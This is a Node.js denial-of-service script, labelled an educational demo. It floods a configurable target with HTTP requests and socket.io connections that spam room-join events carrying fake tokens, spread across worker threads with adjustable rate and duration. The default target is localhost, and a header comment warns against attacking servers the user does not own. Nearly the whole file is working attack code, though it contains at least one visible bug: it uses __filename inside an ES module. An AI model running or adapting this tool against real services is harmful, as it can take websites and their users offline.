#!/usr/bin/env node

/**
 * DDoS Attack Demo Script for Educational Purposes
 * WARNING: Only use this against your own servers for testing!
 * Using this against servers you don't own is illegal.
 */

import http from 'http'
import { io } from 'socket.io-client'
import { Worker, isMainThread, parentPort, workerData } from 'worker_threads'
import { performance } from 'perf_hooks'

const TARGET_URL = 'http://localhost:3000'
const SOCKET_TARGET = 'http://localhost:3000'

class DDoSAttack {
    constructor(options = {}) {
        this.target = options.target || TARGET_URL
        this.socketTarget = options.socketTarget || SOCKET_TARGET
        this.workers = options.workers || 4
        this.requestsPerSecond = options.requestsPerSecond || 100
        this.duration = options.duration || 30 // seconds
        this.attackType = options.attackType || 'mixed' // 'http', 'socket', 'mixed'
        this.running = false
        this.stats = {
            totalRequests: 0,
            successfulRequests: 0,
            failedRequests: 0,
            startTime: null,
            endTime: null
        }
    }

    async start() {
        console.log('🚨 Starting DDoS Attack Demo')
        console.log(`Target: ${this.target}`)
        console.log(`Attack Type: ${this.attackType}`)
        console.log(`Workers: ${this.workers}`)
        console.log(`Requests/sec: ${this.requestsPerSecond}`)
        console.log(`Duration: ${this.duration}s`)
        console.log('⚠️  WARNING: This is for educational purposes only!')
        console.log('')

        this.running = true
        this.stats.startTime = performance.now()

        // Start worker threads for parallel attacks
        const promises = []
        for (let i = 0; i < this.workers; i++) {
            promises.push(this.startWorker(i))
        }

        // Run attack for specified duration
        setTimeout(() => {
            this.stop()
        }, this.duration * 1000)

        await Promise.all(promises)
        this.printResults()
    }

    async startWorker(workerId) {
        return new Promise((resolve) => {
            const worker = new Worker(__filename, {
                workerData: {
                    workerId,
                    target: this.target,
                    socketTarget: this.socketTarget,
                    requestsPerSecond: Math.floor(this.requestsPerSecond / this.workers),
                    attackType: this.attackType,
                    duration: this.duration
                }
            })

            worker.on('message', (data) => {
                if (data.type === 'stats') {
                    this.stats.totalRequests += data.totalRequests
                    this.stats.successfulRequests += data.successfulRequests
                    this.stats.failedRequests += data.failedRequests
                }
            })

            worker.on('exit', () => {
                resolve()
            })
        })
    }

    stop() {
        this.running = false
        this.stats.endTime = performance.now()
        console.log('\n🛑 Stopping attack...')
    }

    printResults() {
        const duration = (this.stats.endTime - this.stats.startTime) / 1000
        console.log('\n📊 Attack Results:')
        console.log(`Duration: ${duration.toFixed(2)}s`)
        console.log(`Total Requests: ${this.stats.totalRequests}`)
        console.log(`Successful: ${this.stats.successfulRequests}`)
        console.log(`Failed: ${this.stats.failedRequests}`)
        console.log(`Requests/sec: ${(this.stats.totalRequests / duration).toFixed(2)}`)
        console.log(`Success Rate: ${((this.stats.successfulRequests / this.stats.totalRequests) * 100).toFixed(2)}%`)
    }
}

// Worker thread code
if (!isMainThread) {
    const { workerId, target, socketTarget, requestsPerSecond, attackType, duration } = workerData
    
    let stats = {
        totalRequests: 0,
        successfulRequests: 0,
        failedRequests: 0
    }

    async function httpFlood() {
        return new Promise((resolve, reject) => {
            const req = http.get(target, (res) => {
                stats.totalRequests++
                if (res.statusCode === 200) {
                    stats.successfulRequests++
                } else {
                    stats.failedRequests++
                }
                res.on('data', () => {}) // consume response
                res.on('end', resolve)
            })

            req.on('error', () => {
                stats.totalRequests++
                stats.failedRequests++
                resolve()
            })

            req.setTimeout(5000, () => {
                req.destroy()
                stats.totalRequests++
                stats.failedRequests++
                resolve()
            })
        })
    }

    async function socketFlood() {
        return new Promise((resolve) => {
            try {
                const socket = io(socketTarget, {
                    timeout: 5000,
                    forceNew: true
                })

                socket.on('connect', () => {
                    stats.totalRequests++
                    stats.successfulRequests++
                    
                    // Spam socket events
                    for (let i = 0; i < 10; i++) {
                        socket.emit('join-room', { roomId: 'spam' + i, token: 'fake', color: 'white' })
                        socket.emit('find-room')
                        socket.emit('get-rooms')
                    }
                    
                    setTimeout(() => {
                        socket.disconnect()
                        resolve()
                    }, 100)
                })

                socket.on('connect_error', () => {
                    stats.totalRequests++
                    stats.failedRequests++
                    resolve()
                })

                socket.on('disconnect', resolve)

                setTimeout(() => {
                    socket.disconnect()
                    stats.totalRequests++
                    stats.failedRequests++
                    resolve()
                }, 5000)

            } catch (error) {
                stats.totalRequests++
                stats.failedRequests++
                resolve()
            }
        })
    }

    async function mixedAttack() {
        if (Math.random() < 0.5) {
            await httpFlood()
        } else {
            await socketFlood()
        }
    }

    // Attack loop
    const interval = 1000 / requestsPerSecond
    const attackFunction = attackType === 'http' ? httpFlood : 
                          attackType === 'socket' ? socketFlood : mixedAttack

    const attackInterval = setInterval(async () => {
        await attackFunction()
    }, interval)

    // Stop after duration
    setTimeout(() => {
        clearInterval(attackInterval)
        parentPort.postMessage({ type: 'stats', ...stats })
        process.exit(0)
    }, duration * 1000)

    console.log(`Worker ${workerId} started`)
}

// Main execution
if (isMainThread) {
    const args = process.argv.slice(2)
    const options = {}

    // Parse command line arguments
    for (let i = 0; i < args.length; i += 2) {
        const key = args[i].replace('--', '')
        const value = args[i + 1]
        
        if (key === 'workers') options.workers = parseInt(value)
        if (key === 'rps') options.requestsPerSecond = parseInt(value)
        if (key === 'duration') options.duration = parseInt(value)
        if (key === 'type') options.attackType = value
        if (key === 'target') options.target = value
    }

    const attack = new DDoSAttack(options)
    
    process.on('SIGINT', () => {
        attack.stop()
        process.exit(0)
    })

    attack.start()
}

export default DDoSAttack